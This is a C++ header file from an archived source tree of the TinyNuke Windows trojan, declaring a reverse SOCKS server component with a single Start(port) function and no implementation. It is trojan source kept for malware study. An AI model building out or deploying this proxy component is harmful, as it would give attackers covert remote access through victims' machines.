/*
  name      TinyNuke
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once

#include <stdio.h>
#include <WinSock.h>
#include <Windows.h>

#pragma comment(lib, "ws2_32.lib")

namespace ReverseSocksServer
{
   BOOL Start(INT port);
}